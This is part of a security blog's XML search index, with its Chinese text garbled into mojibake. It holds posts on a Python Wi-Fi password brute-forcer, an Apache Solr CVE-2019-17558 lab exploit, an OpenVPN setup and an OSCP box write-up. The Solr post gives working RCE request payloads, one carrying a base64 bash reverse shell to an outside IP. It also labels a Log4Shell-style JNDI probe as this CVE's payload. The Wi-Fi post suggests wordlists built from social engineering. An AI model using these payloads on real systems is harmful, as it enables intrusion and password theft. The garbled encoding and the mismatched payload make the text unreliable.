            <tag> Javaä»£ç å®¡è®¡ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€Pythonæ­¦å™¨åº“ã€‘Python Wifiå¯†ç ç ´è§£-Wifiä¸‡èƒ½é’¥åŒ™</title>
      <link href="/2024/10/19/Python-PyWifi/"/>
      <url>/2024/10/19/Python-PyWifi/</url>
      
        <content type="html"><![CDATA[<h1 id="Python-Wifiå¯†ç ç ´è§£-Wifiä¸‡èƒ½é’¥åŒ™"><a href="#Python-Wifiå¯†ç ç ´è§£-Wifiä¸‡èƒ½é’¥åŒ™" class="headerlink" title="Python Wifiå¯†ç ç ´è§£ - Wifiä¸‡èƒ½é’¥åŒ™"></a>Python Wifiå¯†ç ç ´è§£ - Wifiä¸‡èƒ½é’¥åŒ™</h1><h1 id="ä¸€ã€Pyæ¨¡å—å®‰è£…"><a href="#ä¸€ã€Pyæ¨¡å—å®‰è£…" class="headerlink" title="ä¸€ã€Pyæ¨¡å—å®‰è£…"></a>ä¸€ã€Pyæ¨¡å—å®‰è£…</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install comtypes</span><br></pre></td></tr></table></figure><h1 id="äºŒã€ä½¿ç”¨"><a href="#äºŒã€ä½¿ç”¨" class="headerlink" title="äºŒã€ä½¿ç”¨"></a>äºŒã€ä½¿ç”¨</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python PyWifi.py</span><br></pre></td></tr></table></figure><p><img src="/img/Python-PyWifi/image-20241019235946937.png" alt="image-20241019235946937"></p><p><img src="/img/Python-PyWifi/image-20241020000304896.png" alt="image-20241020000304896"></p><h1 id="ä¸‰ã€å­—å…¸è®¾ç½®"><a href="#ä¸‰ã€å­—å…¸è®¾ç½®" class="headerlink" title="ä¸‰ã€å­—å…¸è®¾ç½®"></a>ä¸‰ã€å­—å…¸è®¾ç½®</h1><p>é»˜è®¤ä½¿ç”¨py è„šæœ¬åŒç›®å½•ä¸‹çš„pass.txt æ–‡ä»¶ä½œä¸ºå­—å…¸ï¼Œå¯ä»¥ä¿®æ”¹å­—å…¸ä½ç½®ï¼Œæˆ–ç½®ä¸ºç©ºï¼Œåœ¨ä»£ç è¿è¡Œä¸­é€‰æ‹©å­—å…¸ä½ç½®</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wifi_dic_path = &quot;pass.txt&quot;  # å­—å…¸è®¾ç½®</span><br></pre></td></tr></table></figure><p>å­—å…¸å¯ä»¥ç¤¾å·¥è·å–wifi ç›¸å…³äººå‘˜ä¿¡æ¯åˆ¶ä½œè€Œæˆï¼ŒæˆåŠŸç‡æ›´é«˜</p>]]></content>
      
      
      <categories>
          
          <category> Pythonæ­¦å™¨åº“ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pythonæ­¦å™¨åº“ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€Vulfocusç³»åˆ—ã€‘Apache Solrä»£ç æ‰§è¡Œæ¼æ´ (CVE-2019-17558)</title>
      <link href="/2024/09/22/Vulfocus-solr-RCE/"/>
      <url>/2024/09/22/Vulfocus-solr-RCE/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸€ã€Apache-Solrä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2019-17558ï¼‰ç®€ä»‹"><a href="#ä¸€ã€Apache-Solrä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2019-17558ï¼‰ç®€ä»‹" class="headerlink" title="ä¸€ã€Apache Solrä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2019-17558ï¼‰ç®€ä»‹"></a>ä¸€ã€Apache Solrä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2019-17558ï¼‰ç®€ä»‹</h1><p>Solræ˜¯Apache Luceneé¡¹ç›®çš„å¼€æºä¼ä¸šæœç´¢å¹³å°ã€‚ å…¶ä¸»è¦åŠŸèƒ½åŒ…æ‹¬å…¨æ–‡æ£€ç´¢ã€å‘½ä¸­æ ‡ç¤ºã€åˆ†é¢æœç´¢ã€åŠ¨æ€èšç±»ã€æ•°æ®åº“é›†æˆï¼Œä»¥åŠå¯Œæ–‡æœ¬çš„å¤„ç†ã€‚ 2019å¹´10æœˆ30æ—¥ï¼Œå›½å¤–å®‰å…¨ç ”ç©¶äººå‘˜æ”¾å‡ºäº†ä¸€ä¸ªå…³äºsolr æ¨¡æ¿æ³¨å…¥çš„expï¼Œæ”»å‡»è€…é€šè¿‡æœªæˆæƒè®¿é—®solræœåŠ¡å™¨ï¼Œå‘é€ç‰¹å®šçš„æ•°æ®åŒ…å¼€å¯ params.resource.loader.enabledï¼Œç„¶ågetè®¿é—®æ¥å£å¯¼è‡´æœåŠ¡å™¨å‘½ä»¤æ‰§è¡Œã€‚</p><p><strong>å½±å“èŒƒå›´ï¼š</strong></p><ul><li>5.0.0 åˆ° 8.3.1ç‰ˆæœ¬</li></ul><h1 id="äºŒã€é¦–é¡µ"><a href="#äºŒã€é¦–é¡µ" class="headerlink" title="äºŒã€é¦–é¡µ"></a>äºŒã€é¦–é¡µ</h1><p><img src="/img/Vulfocus-solr-RCE/image-20240922205933443.png" alt="image-20240922205933443"></p><p>å‘ç°æ˜¯8.1.1ï¼Œå­˜åœ¨CVE-2019-17558 æ¼æ´</p><h1 id="ä¸‰ã€æ‰‹å·¥payload"><a href="#ä¸‰ã€æ‰‹å·¥payload" class="headerlink" title="ä¸‰ã€æ‰‹å·¥payload"></a>ä¸‰ã€æ‰‹å·¥payload</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.com/solr/admin/cores?action=$&#123;jndi:ldap://$&#123;sys:java.version&#125;.xxx.dnslog.cn&#125;</span><br></pre></td></tr></table></figure><p><img src="/img/Vulfocus-solr-RCE/image-20240922212059152.png" alt="image-20240922212059152"></p><p>æˆåŠŸæ‰§è¡Œå‘½ä»¤ï¼Œè·å–java çš„ç‰ˆæœ¬å·</p><h1 id="å››ã€å¼€å¯-params-resource-loader-enabled"><a href="#å››ã€å¼€å¯-params-resource-loader-enabled" class="headerlink" title="å››ã€å¼€å¯ params.resource.loader.enabled"></a>å››ã€å¼€å¯ params.resource.loader.enabled</h1><p>æœªæˆæƒè®¿é—® &#x2F;solr&#x2F;demo&#x2F;configï¼Œå¹¶ä¸”ç”¨BPæ”¹åŒ…ã€‚Content-Typeä¿®æ”¹æˆapplication&#x2F;json</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">        &quot;update-queryresponsewriter&quot;: &#123;</span><br><span class="line">        &quot;startup&quot;: &quot;lazy&quot;,</span><br><span class="line">        &quot;name&quot;: &quot;velocity&quot;,</span><br><span class="line">        &quot;class&quot;: &quot;solr.VelocityResponseWriter&quot;,</span><br><span class="line">        &quot;template.base.dir&quot;: &quot;&quot;,</span><br><span class="line">        &quot;solr.resource.loader.enabled&quot;: &quot;true&quot;,</span><br><span class="line">        &quot;params.resource.loader.enabled&quot;: &quot;true&quot;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/img/Vulfocus-solr-RCE/image-20241012210937378.png" alt="image-20241012210937378"></p><h1 id="äº”ã€é€šè¿‡Velocityæ¨¡æ¿æ‰§è¡Œä»»æ„å‘½ä»¤"><a href="#äº”ã€é€šè¿‡Velocityæ¨¡æ¿æ‰§è¡Œä»»æ„å‘½ä»¤" class="headerlink" title="äº”ã€é€šè¿‡Velocityæ¨¡æ¿æ‰§è¡Œä»»æ„å‘½ä»¤"></a>äº”ã€é€šè¿‡Velocityæ¨¡æ¿æ‰§è¡Œä»»æ„å‘½ä»¤</h1><h2 id="1ã€æ‰§è¡Œä»»æ„å‘½ä»¤"><a href="#1ã€æ‰§è¡Œä»»æ„å‘½ä»¤" class="headerlink" title="1ã€æ‰§è¡Œä»»æ„å‘½ä»¤"></a>1ã€æ‰§è¡Œä»»æ„å‘½ä»¤</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.com/solr/demo/select?q=1&amp;&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end</span><br></pre></td></tr></table></figure><p><img src="/img/Vulfocus-solr-RCE/image-20241012211234005.png" alt="image-20241012211234005"></p><h2 id="2ã€åå¼¹shell"><a href="#2ã€åå¼¹shell" class="headerlink" title="2ã€åå¼¹shell"></a>2ã€åå¼¹shell</h2><p>ä¿®æ”¹ä¸­é—´base64å†…å®¹å³å¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.com/solr/demo/select?q=1&amp;&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27bash%20-c%20&#123;echo%2CYmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMTkuMjkuNjcuNC85ODk3IDA%2BJjE%3D&#125;|&#123;base64%2C-d&#125;|&#123;bash%2C-i&#125;%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end</span><br></pre></td></tr></table></figure><h1 id="å…­ã€åˆ©ç”¨è„šæœ¬æˆ–å·¥å…·"><a href="#å…­ã€åˆ©ç”¨è„šæœ¬æˆ–å·¥å…·" class="headerlink" title="å…­ã€åˆ©ç”¨è„šæœ¬æˆ–å·¥å…·"></a>å…­ã€åˆ©ç”¨è„šæœ¬æˆ–å·¥å…·</h1><p>æœ‰å…³CVE-2019-17558 æ¼æ´åˆ©ç”¨è„šæœ¬åœ¨GitHubä¸Šæœ‰å¾ˆå¤š</p><p>msf ä¹Ÿå†…ç½®ç›¸å…³åˆ©ç”¨</p>]]></content>
      
      
      <categories>
          
          <category> Vulfocusç³»åˆ—é¶åœº </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vulfocusç³»åˆ—é¶åœº </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€è¯¾å¤–ç»éªŒã€‘OpenVPNé…ç½®è‡ªå·±çš„åŠ é€Ÿå™¨</title>
      <link href="/2024/08/23/Extracurricular-experience-openvpn/"/>
      <url>/2024/08/23/Extracurricular-experience-openvpn/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸€ã€OpenVPN-æœåŠ¡ç«¯è®¾ç½®"><a href="#ä¸€ã€OpenVPN-æœåŠ¡ç«¯è®¾ç½®" class="headerlink" title="ä¸€ã€OpenVPN æœåŠ¡ç«¯è®¾ç½®"></a>ä¸€ã€OpenVPN æœåŠ¡ç«¯è®¾ç½®</h1><p>1ã€é…ç½®Openvpn æœåŠ¡ç«¯ï¼Œéœ€è¦åœ¨é˜¿*äº‘ç­‰vps æœåŠ¡å™¨ä¸Šè®¾ç½®ï¼Œå…ˆå®‰è£…</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install openvpn</span><br></pre></td></tr></table></figure><p>2ã€å®‰è£… OpenVPN åï¼Œæˆ‘ä»¬éœ€è¦ç”Ÿæˆç”¨äº VPN éš§é“åŠ å¯†çš„é™æ€å¯†é’¥ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openvpn --genkey --secret static-OpenVPN.key</span><br></pre></td></tr></table></figure><p>3ã€æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬éœ€è¦å¯åŠ¨ OpenVPN æœåŠ¡ç«¯ï¼Œå¹¶ç”¨&amp; å°†æœåŠ¡ç«¯æ”¾ç½®åœ¨åå°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo openvpn --dev tun --ifconfig 172.16.0.1 172.16.0.2 --cipher AES-256-CBC --secret static-OpenVPN.key &amp;</span><br></pre></td></tr></table></figure><p>4ã€å¦‚æœæ“ä½œæ­£ç¡®ï¼Œvps ç°åœ¨åº”è¯¥æœ‰ä¸€ä¸ªåä¸º <code>tun0</code> çš„æ–°ç½‘ç»œæ¥å£ï¼Œå…¶ IP åœ°å€ä¸º <code>172.16.0.1</code></p><p>è¾“å…¥ä»¥ä¸‹å‘½ä»¤è¿›è¡ŒéªŒè¯ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip a show tun0</span><br></pre></td></tr></table></figure><p>5ã€è¦è¿›ä¸€æ­¥éªŒè¯ VPN æœåŠ¡å™¨æ˜¯å¦æ­£å¸¸è¿è¡Œï¼Œè¯·æ£€æŸ¥ç³»ç»Ÿä¸Šçš„ UDP ç«¯å£ 1194 æ˜¯å¦å·²æ‰“å¼€ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -anu | grep 1194</span><br></pre></td></tr></table></figure><p>æœ‰è¾“å‡ºåˆ™ç¡®è®¤VPN æœåŠ¡å™¨æ­£å¸¸è¿è¡Œ</p><p>6ã€ç¡®ä¿vps ä¸Šçš„1194ç«¯å£æ­£å¸¸å¯¹å¤–å¼€æ”¾ï¼Œæ²¡æœ‰è¢«é˜²ç«å¢™ç­‰æ‹¦æˆª</p><h1 id="äºŒã€OpenVPN-å®¢æˆ·ç«¯è®¾ç½®"><a href="#äºŒã€OpenVPN-å®¢æˆ·ç«¯è®¾ç½®" class="headerlink" title="äºŒã€OpenVPN å®¢æˆ·ç«¯è®¾ç½®"></a>äºŒã€OpenVPN å®¢æˆ·ç«¯è®¾ç½®</h1><p>ä¸‹é¢ä»¥linuxä¸ºç¤ºä¾‹ï¼ŒwindowsåŒæ ·</p><p>1ã€ç¡®ä¿å®¢æˆ·ç«¯æœ‰openvpnå®¢æˆ·ç«¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install openvpn</span><br></pre></td></tr></table></figure><p>2ã€å°†VPN éš§é“åŠ å¯†çš„é™æ€å¯†é’¥ä¼ å…¥å®¢æˆ·ç«¯ï¼Œå¯ä»¥é€šè¿‡scp å‘½ä»¤è¿›è¡Œssh çš„è¿æ¥ä¼ è¾“</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp user1@linuxconfig:/home/user1/static-OpenVPN.key .</span><br></pre></td></tr></table></figure><p>3ã€è¿›è¡Œopenvpn çš„è¿æ¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo openvpn --remote YOUR-OPENVPN-SERVER-IP-OR-HOST --dev tun --ifconfig 172.16.0.1 172.16.0.2 --cipher AES-256-CBC --secret static-OpenVPN.key &amp;</span><br></pre></td></tr></table></figure><p>4ã€VPN éš§é“åˆ›å»ºå¯èƒ½éœ€è¦å‡ ç§’é’Ÿçš„æ—¶é—´ã€‚å¦‚æœæˆåŠŸï¼Œæ‚¨åº”è¯¥çœ‹åˆ°ä»¥ä¸‹æ¶ˆæ¯ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Initialization Sequence Completed</span><br></pre></td></tr></table></figure><p>5ã€è¦ç¡®è®¤ä¸ VPN æœåŠ¡å™¨çš„æˆåŠŸè¿æ¥ï¼Œè¯·å°è¯• ping è¿œç¨‹ç½‘ç»œä¸Šçš„ä¸»æœº</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ping -c 1 172.16.0.1</span><br><span class="line">PING 172.16.0.1 (172.16.0.1) 56(84) bytes of data.</span><br><span class="line">64 bytes from 172.16.0.1: icmp_seq=1 ttl=64 time=0.061 ms</span><br><span class="line"></span><br><span class="line">--- 172.16.0.1 ping statistics ---</span><br><span class="line">1 packets transmitted, 1 received, 0% packet loss, time 0ms</span><br><span class="line">rtt min/avg/max/mdev = 0.061/0.061/0.061/0.000 ms</span><br></pre></td></tr></table></figure><p>å‚è€ƒé“¾æ¥ï¼š<a href="https://cn.linux-console.net/?p=10930">åŸºæœ¬ Ubuntu 20.04 OpenVPN å®¢æˆ·ç«¯&#x2F;æœåŠ¡å™¨è¿æ¥è®¾ç½® (linux-console.net)</a></p>]]></content>
      
      
      <categories>
          
          <category> å…¶ä»–ç»éªŒ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OpenVPN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€OSCPç³»åˆ—ã€‘OSCPé¶æœºâ€”Vegeta</title>
      <link href="/2024/08/23/OSCP-Vegeta/"/>
      <url>/2024/08/23/OSCP-Vegeta/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸€ã€ä¸»æœºå‘ç°"><a href="#ä¸€ã€ä¸»æœºå‘ç°" class="headerlink" title="ä¸€ã€ä¸»æœºå‘ç°"></a>ä¸€ã€ä¸»æœºå‘ç°</h1><p><img src="/img/OSCP-Vegeta/image-20240823121642788.png" alt="image-20240823121642788"></p><h1 id="äºŒã€ç«¯å£æ‰«æ"><a href="#äºŒã€ç«¯å£æ‰«æ" class="headerlink" title="äºŒã€ç«¯å£æ‰«æ"></a>äºŒã€ç«¯å£æ‰«æ</h1><h2 id="1ã€å…¨ç«¯å£æ‰«æ"><a href="#1ã€å…¨ç«¯å£æ‰«æ" class="headerlink" title="1ã€å…¨ç«¯å£æ‰«æ"></a>1ã€å…¨ç«¯å£æ‰«æ</h2><p><img src="/img/OSCP-Vegeta/image-20240823121759816.png" alt="image-20240823121759816"></p><p>åªå¼€æ”¾22ã€80ç«¯å£ï¼ŒåŠ ä¸ŠUDPæ‰«æ</p><h2 id="2ã€æœåŠ¡ç‰ˆæœ¬æ¢æµ‹"><a href="#2ã€æœåŠ¡ç‰ˆæœ¬æ¢æµ‹" class="headerlink" title="2ã€æœåŠ¡ç‰ˆæœ¬æ¢æµ‹"></a>2ã€æœåŠ¡ç‰ˆæœ¬æ¢æµ‹</h2><p><img src="/img/OSCP-Vegeta/image-20240823122002934.png" alt="image-20240823122002934"></p><p>80çš„Apache ä½¿ç”¨ 2.4.38ç‰ˆæœ¬ï¼Œæœ‰å…³è¿™ä¸ªç‰ˆæœ¬åœ¨ä¸€å®šæ¡ä»¶ä¸‹æ˜¯å­˜åœ¨æ¼æ´çš„ï¼Œç³»ç»Ÿè·‘åœ¨Linux 4.x|5.x </p><h2 id="3ã€æ¼æ´æ¢æµ‹"><a href="#3ã€æ¼æ´æ¢æµ‹" class="headerlink" title="3ã€æ¼æ´æ¢æµ‹"></a>3ã€æ¼æ´æ¢æµ‹</h2><p><img src="/img/OSCP-Vegeta/image-20240823122658255.png" alt="image-20240823122658255"></p><p>80ç«¯å£åªæ‰«äº†ä¸€äº›ç›®å½•</p><h1 id="ä¸‰ã€HTTPä¿¡æ¯æ”¶é›†"><a href="#ä¸‰ã€HTTPä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¸‰ã€HTTPä¿¡æ¯æ”¶é›†"></a>ä¸‰ã€HTTPä¿¡æ¯æ”¶é›†</h1><h2 id="1ã€é¦–é¡µæºä»£ç "><a href="#1ã€é¦–é¡µæºä»£ç " class="headerlink" title="1ã€é¦–é¡µæºä»£ç "></a>1ã€é¦–é¡µæºä»£ç </h2><p><img src="/img/OSCP-Vegeta/image-20240823122833521.png" alt="image-20240823122833521"></p><p>é¦–é¡µå°±ä¸€å¼ å›¾ç‰‡</p><p><img src="/img/OSCP-Vegeta/image-20240823122853320.png" alt="image-20240823122853320"></p><p>çœ‹è¿‡äº†ï¼Œæ²¡æ†ç»‘æ²¡éšå†™</p><h2 id="2ã€ç›®å½•æ‰«æ"><a href="#2ã€ç›®å½•æ‰«æ" class="headerlink" title="2ã€ç›®å½•æ‰«æ"></a>2ã€ç›®å½•æ‰«æ</h2><p>gobusteræ‰«æç»“æœï¼Œå‘ç°å››ä¸ªç›®å½•ï¼Œå…¶ä¸­admin ä»¤æˆ‘ä»¬å¾ˆæ„Ÿå…´è¶£</p><p><img src="/img/OSCP-Vegeta/image-20240823123547386.png" alt="image-20240823123547386"></p><p>&#x2F;admin é‡Œé¢åªæœ‰ä¸€ä¸ª admin.php æ–‡ä»¶</p><p><img src="/img/OSCP-Vegeta/image-20240823123621404.png" alt="image-20240823123621404"></p><p>æ¨æµ‹æœ‰ç±»ä¼¼ctf é‚£æ ·æœ‰æºç æ³„éœ²çš„åœ°æ–¹ï¼Œä½†æ˜¯è¿™ä¸ªæ–‡ä»¶å¤¹å°±å®ƒä¸€ä¸ªæ–‡ä»¶ï¼Œä¸”å­—èŠ‚å¤§å°åªæœ‰9</p><p><img src="/img/OSCP-Vegeta/image-20240823123742142.png" alt="image-20240823123742142"></p><p>robots.txt æ–‡ä»¶ç»™å‡ºäº†æç¤º</p><p><img src="/img/OSCP-Vegeta/image-20240823134636819.png" alt="image-20240823134636819"></p><p>æŒ‡å‘äº†ä¸€ä¸ª<code>Vegeta-1.0</code>çš„æç¤º</p><p><img src="/img/OSCP-Vegeta/image-20240823134713611.png" alt="image-20240823134713611"></p><p>åœ¨é¡µé¢æºä»£ç ç»™å‡ºäº†base64ç¼–ç çš„å†…å®¹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- aVZCT1J3MEtHZ29BQUFBTlNVaEVVZ0FBQU1nQUFBRElDQVlBQUFDdFdLNmVBQUFIaGtsRVFWUjRuTzJad1k0c09RZ0U1LzkvK3UyMU5TdTdCd3JTaVN0QzhoR2M0SXBMOTg4L0FGanljem9BZ0RNSUFyQUJRUUEySUFqQUJnUUIySUFnQUJzUUJHQURnZ0JzUUJDQURRZ0NzQUZCQURhRUJmbjUrUmwvbk9aTFAxeER6K3g5VTA1cWJoWjFkcjRzSFQyejkwMDVxYmxaMU5uNXNuVDB6TjQzNWFUbVpsRm41OHZTMFRONzM1U1RtcHRGblowdlMwZlA3SDFUVG1wdUZuVjJ2aXdkUGJQM1RUbXB1Vm5VMmZteWRQVE0zamZscE9hdVhKUVRUamxkSHZ0YmxvNDZOUWp5UjV4eUlvZ09CUGtqVGprUlJBZUMvQkdubkFpaUEwSCtpRk5PQk5HQklIL0VLU2VDNkVDUVArS1VFMEYwakJWRS9aSGM4SEhkUHZ1RWQwZVF3N003MWFtelRIaDNCRGs4dTFPZE9zdUVkMGVRdzdNNzFhbXpUSGgzQkRrOHUxT2RPc3VFZDBlUXc3TTcxYW16VEhoM0JEazh1MU9kT3N1RWQwZVFJcWJNNENUcmhKMGhTQkZUWmtDUUdBaFN4SlFaRUNRR2doUXhaUVlFaVlFZ1JVeVpBVUZpSUVnUlUyWkFrQmdJVXNTVUdSQWtCb0lVMFRHZjAxN2UrdTRJVXNScEtSRGtXYzVsdjNEQlN4ZjFqZE5TSU1pem5NdCs0WUtYTHVvYnA2VkFrR2M1bC8zQ0JTOWQxRGRPUzRFZ3ozSXUrNFVMWHJxb2I1eVdBa0dlNVZ6MkN4ZThkRkhmT0MwRmdqekx1ZXdYTGhCL2VGazZjcm84Mm9rc2IzMTNCQkgwdkNITFc5OGRRUVE5YjhqeTFuZEhFRUhQRzdLODlkMFJSTkR6aGl4dmZYY0VFZlM4SWN0YjN4MUJCRDF2eVBMV2R5OFZaTXJwV1BDYjY2YWNEQWdTbUkrNjJTY0RnZ1RtbzI3MnlZQWdnZm1vbTMweUlFaGdQdXBtbnd3SUVwaVB1dGtuQTRJRTVxTnU5c25nOVNPMkFjcmxQN212SXd2OEg3YjVDd1NCVDlqbUx4QUVQbUdidjBBUStJUnQvZ0pCNEJPMitRc0VnVS9ZNWk4UUJENlIvUS9pMURPTFU4OHBkV3FxY3lKSTBlenFubFBxMUNBSWdveXFVNE1nQ0RLcVRnMkNJTWlvT2pVSWdpQ2o2dFFnQ0lLTXFsTnpYQkExYnhZeWk5TU1UbStVeWwvZXNSZ0VpZU0wZzlNYnBmS1hkeXdHUWVJNHplRDBScW44NVIyTFFaQTRUak00dlZFcWYzbkhZaEFranRNTVRtK1V5bC9lc1JnRWllTTBnOU1icGZLWGR5d0dRZUk0emVEMFJxbjhwYzJTUTcxWkFxZlpwd2pTVWJmc2w2cEtoRU1RajV3SUVzeWZxa3FFUXhDUG5BZ1N6SitxU29SREVJK2NDQkxNbjZwS2hFTVFqNXdJRXN5ZnFrcUVReENQbkFnU3pKK3FTb1JERUkrY0NCTE1uNm9xRHVleWpLNmVhcHdFNmNpWjdabkttS29xRHVleWpLNmVhaEFFUVI3VnFYdXFRUkFFZVZTbjdxa0dRUkRrVVoyNnB4b0VRWkJIZGVxZWFoQUVRUjdWcVh1cVFaQ0JncWcvNWpmZjEvRngzUzdXOHE2cHdia1BRUkNFK3hDa01HZnFycW5CdVE5QkVJVDdFS1F3WitxdXFjRzVEMEVRaFBzUXBEQm42cTdLY0ZtY0hzYnBvM1RLMlpGbEFnaHlPQXVDZUlNZ2g3TWdpRGNJY2pnTGduaURJSWV6SUlnM0NISTRDNEo0Z3lDSHN5Q0lONldDM1A0d1RvL3RKTEo2TDhvc0NGSjBueG9FUVpDMkxCMzNxVUVRQkduTDBuR2ZHZ1JCa0xZc0hmZXBRUkFFYWN2U2NaOGFCRUdRdGl3ZDk2bEJrSUdDZE5TcGUyYnZVMzk0Nm5mb3lPazAzN0pmdU1Ba2VGZlA3SDFPSDE3MlBuVk9wL21XL2NJRkpzRzdlbWJ2Yy9yd3N2ZXBjenJOdCt3WExqQUozdFV6ZTUvVGg1ZTlUNTNUYWI1bHYzQ0JTZkN1bnRuN25ENjg3SDNxbkU3ekxmdUZDMHlDZC9YTTN1ZjA0V1h2VStkMG1tL1pMMXhnRXJ5clovWStwdzh2ZTU4NnA5Tjh5MzdoQXZHSGZzUHlPN0pNMmFkNlp3aGkrbWdkODkyd1R3UzU3RUU3WmtjUUJMbm1RVHRtUnhBRXVlWkJPMlpIRUFTNTVrRTdaa2NRQkxubVFUdG1SNUFYQ1hJNzZnKzJBN1dRSFZrNnhFcmxUMVZkRElKNFpFRVFVeERFSXd1Q21JSWdIbGtReEJRRThjaUNJS1lnaUVjV0JERUZRVHl5akJXa1kyRDFjV0xLQitUeXdYNERRUkFFUVlUM0ljaGhFS1FXQkVFUUJCSGVoeUNIUVpCYUVBUkJFRVI0SDRJY0JrRnFzUmJFaVk2Y04zek1UaCtzK28xUy9VNEg2QUpCRUFSQk5pQUlnaURJQmdSQkVBVFpnQ0FJZ2lBYkVBUkJFR1FEZ2lESUtFRnUrTGc2NW5QSzRuVFV1MTdlRlM0d2VqUjF6bzc1bkxJNEhmV3VsM2VGQzR3ZVRaMnpZejZuTEU1SHZldmxYZUVDbzBkVDUreVl6eW1MMDFIdmVubFh1TURvMGRRNU8rWnp5dUowMUx0ZTNoVXVNSG8wZGM2TytaeXlPQjMxcnBkM2hRdU1IazJkczJNK3B5eE9SNzNyNVYzaEFxTkhVK2QwMnN1VUxOTnpJb2h4M1ExWnB1ZEVFT082RzdKTXo0a2d4blUzWkptZUUwR002MjdJTWowbmdoalgzWkJsZWs0RU1hNjdJY3YwbkFoU3hKUVoxRDJuZkMvTEhKWExjQm9ZUVR4NlR2bGVsamtxbCtFME1JSjQ5Snp5dlN4elZDN0RhV0FFOGVnNTVYdFo1cWhjaHRQQUNPTFJjOHIzc3N4UnVReW5nUkhFbytlVTcyV1pvM0laVGdNamlFZlBLZC9MTWtmbE1weVk4bEVxSC9zSlRoODZnaFNBSUxVZ1NQT2kxQ0JJTFFqU3ZDZzFDRklMZ2pRdlNnMkMxSUlnell0U2d5QzFJRWp6b3RRZ1NDMElVckNvS1NjN245TmVzcHplZmNVTTJmbFMvU29EVERrZEMzYWF3U2tuZ2d3OEhRdDJtc0VwSjRJTVBCMExkcHJCS1NlQ0REd2RDM2Fhd1NrbmdndzhIUXQybXNFcEo0SU1QQjBMZHByQktlZnJCQUY0RXdnQ3NBRkJBRFlnQ01BR0JBSFlnQ0FBR3hBRVlBT0NBR3hBRUlBTkNBS3dBVUVBTmlBSXdBWUVBZGp3SHlVRnd2VnIwS3ZGQUFBQUFFbEZUa1N1UW1DQw== 